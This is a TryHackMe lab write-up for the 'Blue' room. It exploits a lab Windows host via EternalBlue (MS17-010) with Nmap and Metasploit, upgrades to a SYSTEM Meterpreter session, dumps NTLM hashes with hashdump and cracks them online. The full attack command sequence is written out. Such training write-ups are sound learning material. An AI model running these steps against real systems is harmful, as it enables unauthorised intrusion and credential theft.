# Blue

| | |
|---|---|
| **Date Completed** | 26/04/2026 |
| **Difficulty** | <span class="diff-tag">Easy</span> |
| **Room Link** | [tryhackme.com/room/blue](https://tryhackme.com/room/blue) |
| **Learning Path** | CyberSecurity 101 |

---

## :clipboard: Overview

Blue is a guided Windows exploitation room that walks through the full attack chain against a vulnerable Windows machine using the EternalBlue exploit (MS17-010). The room covers reconnaissance, exploitation via Metasploit, privilege escalation, credential harvesting, and flag hunting.

---

## :dart: Key Learning Objectives

- [x] Enumerate a target with Nmap to discover vulnerabilities
- [x] Exploit MS17-010 (EternalBlue) using Metasploit
- [x] Upgrade a basic shell to a Meterpreter session
- [x] Verify privilege level on a compromised Windows machine
- [x] Dump and crack password hashes from the system

---

## :pencil: Notes

### Task 1: Recon

I scanned the target with Nmap to discover open ports and known vulnerabilities:

```bash
nmap -sV -sC --script vuln 10.128.142.125
```

| Flag | Purpose |
|---|---|
| `-sV` | Probes open ports to determine the service and version running |
| `-sC` | Runs the default NSE script set (commonly useful scripts) |
| `--script vuln` | Actively checks discovered services for known vulnerabilities |

The scan returned a critical finding on SMB:

```
smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

The machine is vulnerable to **EternalBlue** — the NSA-leaked exploit that was weaponised in the WannaCry ransomware campaign.

### Task 2: Gain Access

I launched Metasploit and searched for the EternalBlue module:

```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.128.142.125
run
```

The exploit succeeded and dropped a shell on the target.

### Task 3: Escalate — Upgrade to Meterpreter

The initial shell is limited: no tab completion, no file transfer, no pivoting support, and no built-in privilege escalation helpers. I upgraded it to a Meterpreter session:

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

With Meterpreter active, I dropped into the Windows shell to check the current user:

```bash
shell
whoami
```

!!! success "NT AUTHORITY\\SYSTEM"
    `NT AUTHORITY\SYSTEM` is the highest privilege level on Windows — equivalent to root on Linux. Full control of the machine.

### Task 4: Cracking — Dump and Crack Hashes

I used Meterpreter's `hashdump` command to extract all local account password hashes:

```bash
hashdump
```

This returns hashes in `username:RID:LM_hash:NTLM_hash` format. I copied the NTLM hashes and submitted them to [CrackStation](https://crackstation.net) to recover the plaintext passwords.

!!! warning "Hash Cracking Note"
    CrackStation works against its precomputed rainbow tables. Strong, unique passwords won't appear — use it only for weak/common passwords during authorised testing.

### Task 5: Find the Flags

With SYSTEM-level Meterpreter I searched the entire filesystem for flag files:

```bash
search -f flag*.txt
```

The command recursively searches all drives for files matching the pattern and returns their full paths, making it straightforward to locate all flags on the machine.

---

## :wrench: Tools Used

| Tool | Purpose |
|---|---|
| [Nmap](https://nmap.org) | Port scanning and vulnerability detection (`--script vuln`) |
| Metasploit (`msfconsole`) | Exploitation via `ms17_010_eternalblue` and shell upgrade |
| Meterpreter | Post-exploitation: `hashdump`, `search`, `shell` |
| [CrackStation](https://crackstation.net) | Online NTLM hash cracking via rainbow tables |

---

## :bulb: Key Takeaways

1. **Nmap's `--script vuln` flag** is a fast first step to surface critical CVEs without manually knowing what to look for
2. **EternalBlue (MS17-010)** exploits the SMBv1 protocol — patched by Microsoft in MS17-010, but still found on unpatched or legacy Windows systems
3. **Always upgrade your shell to Meterpreter** — the additional capabilities (file transfer, pivoting, hashdump) make post-exploitation far more effective
4. **`NT AUTHORITY\SYSTEM`** means the exploit landed with the highest possible privilege — no further escalation needed
5. **NTLM hashes** from `hashdump` can be cracked offline against rainbow tables; weak passwords fall quickly, reinforcing the importance of password complexity
